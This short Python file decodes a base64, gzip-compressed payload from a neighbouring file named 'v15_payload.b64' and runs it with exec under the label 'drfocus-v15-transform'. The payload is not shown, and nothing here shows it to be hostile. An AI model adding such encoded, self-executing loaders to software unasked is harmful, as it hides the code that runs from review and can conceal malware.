from pathlib import Path
import base64, gzip
payload = Path(__file__).with_name('v15_payload.b64').read_text(encoding='utf-8')
source = gzip.decompress(base64.b64decode(''.join(payload.split()))).decode('utf-8')
exec(compile(source, '<drfocus-v15-transform>', 'exec'), globals(), globals())
